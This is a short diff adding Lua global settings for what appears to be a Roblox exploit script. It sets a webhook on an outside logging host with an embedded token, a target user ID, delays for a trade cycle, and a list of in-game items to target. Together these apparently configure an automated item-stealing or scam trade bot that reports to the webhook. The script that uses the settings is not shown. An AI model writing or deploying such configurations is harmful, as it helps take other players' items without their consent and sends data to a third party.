@@ -1,0 +1,8 @@
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_271ee53dcd5946a28cff01752b9b5571"
+getgenv().TARGET_ID = 10449857186
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Los Combinasionas"] = true,
+    ["Esok Sekolah"] = true
+}
